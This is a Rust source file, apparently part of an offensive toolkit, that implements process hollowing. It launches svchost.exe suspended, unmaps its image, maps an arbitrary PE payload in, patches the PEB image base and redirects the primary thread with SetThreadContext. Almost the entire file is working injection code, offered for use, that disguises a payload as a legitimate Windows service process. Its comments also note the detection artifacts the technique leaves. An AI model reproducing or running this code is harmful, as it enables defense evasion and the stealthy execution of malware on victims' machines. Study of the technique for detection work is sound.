//! Process Hollowing injection (T1055.012).
//!
//! Creates svchost.exe suspended, unmaps its original image, maps our PE,
//! patches PEB.ImageBaseAddress, redirects the primary thread via SetThreadContext,
//! and resumes.
//!
//! Detection artifacts:
//! - Sysmon EID 8: none (no CreateRemoteThread)
//! - THREATINT_SETTHREADCONTEXT_REMOTE fires on SetThreadContext
//! - Memory scanner: new executable image at remote base
#![cfg(windows)]
#![allow(unsafe_code)]

use super::{pe_map, winapi::ZwUnmapViewOfSection, InjectionError};
use core::ffi::c_void;
use core::mem::size_of;
use core::ptr::null;
use windows_sys::{
    Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation},
    Win32::{
        Foundation::{CloseHandle, FALSE, HANDLE},
        System::{
            Diagnostics::Debug::{
                GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
            },
            Threading::{
                CreateProcessW, ResumeThread, TerminateProcess, CREATE_SUSPENDED,
                PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW,
            },
        },
    },
};

// CONTEXT_ALL for AMD64: matches WinNT.h CONTEXT_ALL definition.
const CONTEXT_ALL_AMD64: u32 = 1_048_607;

/// Inject `payload` into a freshly created, suspended svchost.exe via process hollowing.
pub fn inject(payload: &[u8]) -> Result<(), InjectionError> {
    // Step 1: create svchost.exe suspended.
    let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let mut path_wide: Vec<u16> = "C:\\Windows\\System32\\svchost.exe -k DcomLaunch\0"
        .encode_utf16()
        .collect();

    let ok = unsafe {
        CreateProcessW(
            null(),
            path_wide.as_mut_ptr(),
            null(),
            null(),
            FALSE,
            CREATE_SUSPENDED,
            null(),
            null(),
            &mut si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err(InjectionError::OpenFailed(
            "CreateProcessW svchost failed".into(),
        ));
    }

    // Convenience macro: terminate + close handles, then return error.
    macro_rules! bail {
        ($e:expr) => {{
            unsafe {
                TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
            return Err($e);
        }};
    }

    let proc: HANDLE = pi.hProcess;

    // Step 2: get PEB base via NtQueryInformationProcess.
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { core::mem::zeroed() };
    let mut len: u32 = 0;
    let status = unsafe {
        NtQueryInformationProcess(
            proc,
            ProcessBasicInformation,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut len,
        )
    };
    if status != 0 {
        bail!(InjectionError::OpenFailed(format!(
            "NtQueryInformationProcess status {status:#x}"
        )));
    }
    let peb_addr = pbi.PebBaseAddress as usize;

    // Step 3: read PEB.ImageBaseAddress (offset 0x10 in 64-bit PEB).
    let mut img_base: u64 = 0;
    let mut r: usize = 0;
    let ok = unsafe {
        ReadProcessMemory(
            proc,
            (peb_addr + 0x10) as *const c_void,
            &mut img_base as *mut u64 as *mut c_void,
            8,
            &mut r,
        )
    };
    if ok == 0 || r != 8 {
        bail!(InjectionError::OpenFailed(
            "ReadProcessMemory PEB.ImageBase failed".into()
        ));
    }

    // Step 4: unmap original image.
    let status = unsafe { ZwUnmapViewOfSection(proc, img_base as *mut c_void) };
    if status != 0 {
        bail!(InjectionError::AllocFailed(format!(
            "ZwUnmapViewOfSection status {status:#x}"
        )));
    }

    // Step 5: map our PE into the remote process.
    let remote_base = match pe_map::map_pe_into(proc, payload) {
        Ok(b) => b,
        Err(e) => bail!(e),
    };

    // Calculate OEP before we move remote_base.
    let oep = match pe_map::remote_oep(payload, remote_base) {
        Ok(p) => p as usize,
        Err(e) => bail!(e),
    };

    // Step 6: patch PEB.ImageBaseAddress to new remote base.
    let new_base: u64 = remote_base as u64;
    let mut w: usize = 0;
    let ok = unsafe {
        WriteProcessMemory(
            proc,
            (peb_addr + 0x10) as *mut c_void,
            &new_base as *const u64 as *const c_void,
            8,
            &mut w,
        )
    };
    if ok == 0 || w != 8 {
        bail!(InjectionError::WriteFailed(
            "WriteProcessMemory PEB.ImageBase failed".into()
        ));
    }

    // Step 7: redirect primary thread to OEP via SetThreadContext.
    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_ALL_AMD64;

    let ok = unsafe { GetThreadContext(pi.hThread, &mut ctx) };
    if ok == 0 {
        bail!(InjectionError::ThreadFailed(
            "GetThreadContext failed".into()
        ));
    }

    ctx.Rip = oep as u64;
    // Rcx is the thread start parameter; zero is safe for an EXE-style PE entry point
    // (receives NULL as parameter, which is standard for process entry).
    ctx.Rcx = 0;

    let ok = unsafe { SetThreadContext(pi.hThread, &ctx) };
    if ok == 0 {
        bail!(InjectionError::ThreadFailed(
            "SetThreadContext failed".into()
        ));
    }

    // Step 8: resume the primary thread and close handles.
    let prev_count = unsafe { ResumeThread(pi.hThread) };
    if prev_count == u32::MAX {
        // Resume failed — still close handles, return error.
        unsafe {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        return Err(InjectionError::ThreadFailed("ResumeThread failed".into()));
    }
    unsafe {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    Ok(())
}
